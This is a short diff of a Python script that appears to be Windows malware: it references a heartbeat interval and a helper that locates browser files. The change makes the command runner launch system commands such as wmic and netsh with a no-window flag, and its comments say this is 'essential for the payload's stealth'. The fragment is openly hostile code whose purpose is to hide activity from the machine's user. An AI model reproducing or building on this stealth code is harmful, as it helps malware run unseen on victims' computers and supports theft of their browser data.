@@ -35,10 +35,23 @@ HEARTBEAT_INTERVAL = 30
 # --- HELPER FUNCTIONS (UNCHANGED) ---
 # ==================================================================================================
 def run_command(command):
+    """
+    Runs a shell command and captures its output.
+    Crucially, it uses the CREATE_NO_WINDOW creation flag on Windows to prevent
+    any command-line windows from flashing open when the commands are executed.
+    This is essential for the payload's stealth.
+    """
     try:
-        startupinfo = subprocess.STARTUPINFO(); startupinfo.wShowWindow = subprocess.SW_HIDE
-        return subprocess.check_output(command, startupinfo=startupinfo, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8', 'ignore').strip()
-    except Exception: return "N/A"
+        # The CREATE_NO_WINDOW flag is the key to preventing subprocess console windows from appearing on Windows.
+        # This prevents commands like 'wmic' or 'netsh' from flashing a black box.
+        return subprocess.check_output(
+            command,
+            stderr=subprocess.DEVNULL,
+            stdin=subprocess.DEVNULL,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        ).decode('utf-8', 'ignore').strip()
+    except Exception:
+        return "N/A"
 
 def find_browser_paths(target_filename):
     paths = []
